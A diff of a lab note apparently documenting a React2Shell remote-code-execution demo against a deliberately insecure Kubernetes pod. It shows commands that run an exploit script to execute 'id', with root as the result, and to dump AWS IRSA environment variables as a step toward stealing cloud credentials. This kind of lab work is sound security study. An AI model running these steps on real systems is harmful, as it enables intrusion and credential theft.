@@ -133,28 +133,28 @@ React2Shell RCE in pod
 
 ---
 
-- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`.
+- App port-forwarded at `react2shell.arguswatcher.net:3000`.
 - Exploit via `scripts/rce.py`.
 
 ```sh
 # restart the pod to pick up the IRSA token
-kubectl rollout restart deploy/react2shell -n insecure-frontend
+kubectl rollout restart deploy/react2shell -n react
 
 # port forward
-kubectl port-forward service/react2shell -n insecure-frontend 3000:3000
+kubectl port-forward service/react2shell -n react 3000:3000
 
-vi /etc/hosts
-# 127.0.0.1 react2shell-insecure.arguswatcher.net
+sudo vi /etc/hosts
+# 127.0.0.1 react2shell.arguswatcher.net
 
 # ##############################
 # Attack
 # ##############################
 # 1. confirm RCE by id
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "id"
 # uid=0(root) gid=0(root) groups=0(root)
 
 # 2. detect IRSA — pod has an AWS identity
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "env | grep AWS"
 # AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
 # AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
 # AWS_STS_REGIONAL_ENDPOINTS=regional
